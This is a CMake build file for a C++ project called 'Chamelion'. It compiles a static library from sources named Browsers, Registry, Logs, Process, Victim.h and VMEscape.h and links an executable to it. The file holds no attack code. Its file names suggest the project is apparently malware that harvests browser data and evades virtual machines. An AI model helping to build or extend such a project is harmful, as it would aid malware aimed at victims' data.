cmake_minimum_required(VERSION 3.5 FATAL_ERROR)
project(Chamelion LANGUAGES CXX)
if(NOT CMAKE_BUILD_TYPE)
	set(CMAKE_BUILD_TYPE Release CACHE STRING "Build Type" FORCE)
endif()
message(STATUS "Build Type : ${CMAKE_BUILD_TYPE}")
add_library(ChamelionLibs
	STATIC
		../src/Includes.h
		../src/Browsers.h
		../src/Browsers.cpp
		../src/Directories.h
		../src/Directories.cpp
		../src/Logs.h
		../src/Logs.cpp
		../src/Misc.h
		../src/Misc.cpp
		../src/Process.h
		../src/Process.cpp
		../src/Registry.cpp
		../src/Registry.h
		../src/Timing.h
		../src/Timing.cpp
		../src/Victim.h
		../src/VMEscape.h
		)
	
add_executable(Chamelion ../src/Source.cpp)

target_link_libraries(Chamelion ChamelionLibs)
